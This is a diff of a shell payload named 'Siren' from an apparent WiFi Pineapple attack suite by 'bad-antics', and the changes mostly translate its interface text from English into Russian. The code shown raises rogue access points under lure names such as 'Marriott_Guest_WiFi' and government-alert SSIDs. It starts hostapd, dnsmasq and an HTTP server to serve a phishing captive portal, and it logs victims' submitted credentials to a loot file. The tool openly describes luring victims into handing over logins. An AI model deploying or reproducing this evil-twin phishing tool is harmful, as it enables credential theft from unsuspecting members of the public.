@@ -15,35 +15,35 @@ LOOT_DIR="/mmc/nullsec/siren"
 PORTAL_DIR="/mmc/nullsec/portals"
 mkdir -p "$LOOT_DIR" "$PORTAL_DIR/siren"
 
-PROMPT "    ╔═╗╦╦═╗╔═╗╔╗╔
+PROMPT "    ╔═╗╦╦═╝╔═╗╔╗╔
     ╚═╗║╠╦╝║╣ ║║║
     ╚═╝╩╩╚═╚═╝╝╚╝
 ━━━━━━━━━━━━━━━━━━━━━━━━━
-The Wireless Lure
+Сирена для WiFi
 
-Sing them to their doom
-with irresistible
-network names.
+Привлекайте жертв
+неотразимыми именами
+сетей.
 
-They will connect.
-They will submit.
+Они подключатся.
+Они сдадутся.
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 Разработано: bad-antics"
 
-PROMPT "SIREN SONGS:
+PROMPT "ПЕСНИ СИРЕНЫ:
 
-1. Hotel WiFi
-2. Airport Free
-3. Coffee Shop
-4. Social Login
-5. Corporate Guest
-6. Free Premium WiFi
-7. Government Alert
-8. WiFi Survey (Prize)"
+1. WiFi Отеля
+2. Аэропорт Бесплатно
+3. Кофейня
+4. Социальный вход
+5. Гостевой корпоратив
+6. Премиум WiFi
+7. Гос. Оповещение
+8. Опрос WiFi (Приз)"
 
-SONG=$(NUMBER_PICKER "Choose song (1-8):" 1)
+SONG=$(NUMBER_PICKER "Выберите песню (1-8):" 1)
 
-# Set SSID and portal based on selection
+# Установка SSID и портала на основе выбора
 case $SONG in
     1) SSID="Marriott_Guest_WiFi"; PORTAL_TYPE="hotel" ;;
     2) SSID="Airport_Free_WiFi"; PORTAL_TYPE="airport" ;;
@@ -55,23 +55,23 @@ case $SONG in
     8) SSID="WiFi_Survey_WIN"; PORTAL_TYPE="survey" ;;
 esac
 
-CUSTOM_SSID=$(TEXT_PICKER "SSID (or use default):" "$SSID")
+CUSTOM_SSID=$(TEXT_PICKER "SSID (или стандартный):" "$SSID")
 [ -n "$CUSTOM_SSID" ] && SSID="$CUSTOM_SSID"
 
-CONFIRMATION_DIALOG "DEPLOY SIREN:
+CONFIRMATION_DIALOG "РАЗВЕРНУТЬ СИРЕНУ:
 SSID: $SSID
-Portal: $PORTAL_TYPE
+Портал: $PORTAL_TYPE
 
-Victims will be lured
-to submit credentials.
+Жертвы будут привлечены
+предоставить учётные данные.
 
-Deploy?"
+Развернуть?"
 [ $? -ne 0 ] && exit 0
 
 INTERFACE="$IFACE"
 LOOT_FILE="$LOOT_DIR/siren_$(date +%Y%m%d_%H%M%S).txt"
 
-# Generate portal HTML
+# Создание HTML портала
 create_portal() {
     local TYPE="$1"
     local HTML="$PORTAL_DIR/siren/index.html"
@@ -194,8 +194,8 @@ cat > "$LOOT_FILE" << EOF
 CAPTURED CREDENTIALS:
 EOF
 
-LOG "Siren singing..."
-SPINNER_START "Luring victims to $SSID..."
+LOG "Сирена поёт..."
+SPINNER_START "Привлечение жертв к $SSID..."
 
 # Start AP
 pkill hostapd dnsmasq 2>/dev/null
@@ -224,22 +224,22 @@ cd "$PORTAL_DIR/siren"
 python3 -m http.server 80 2>/dev/null &
 WEB_PID=$!
 
-# Wait for user to stop
-PROMPT "SIREN ACTIVE
+# Ожидание остановки пользователем
+PROMPT "СИРЕНА АКТИВНА
 ━━━━━━━━━━━━━━━━━━━━━━━━━
-Broadcasting: $SSID
+Вещание: $SSID
 
-Portal: $PORTAL_TYPE
-Listening for victims...
+Портал: $PORTAL_TYPE
+Ожидание жертв...
 
-Press OK to stop
-and view captures.
+Нажмите OK для остановки
+и просмотра захватов.
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 Разработано: bad-antics"
 
 SPINNER_STOP
 
-# Cleanup
+# Очистка
 pkill hostapd dnsmasq 2>/dev/null
 kill $WEB_PID 2>/dev/null
 
@@ -248,19 +248,19 @@ CAPTURES=$(grep -c "^\[" "$LOOT_FILE" 2>/dev/null || echo 0)
 cat >> "$LOOT_FILE" << EOF
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- SIREN STOPPED
- Total Captures: $CAPTURES
+ СИРЕНА ОСТАНОВЛЕНА
+ Всего захватов: $CAPTURES
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  NullSec Pineapple Suite | Разработано: bad-antics
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 EOF
 
-PROMPT "SIREN SILENCED
+PROMPT "СИРЕНА ЗАТИХЛА
 ━━━━━━━━━━━━━━━━━━━━━━━━━
-The song ends.
+Песня закончилась.
 
 SSID: $SSID
-Captures: $CAPTURES
+Захватов: $CAPTURES
 
 Журнал: $LOOT_FILE
 ━━━━━━━━━━━━━━━━━━━━━━━━━
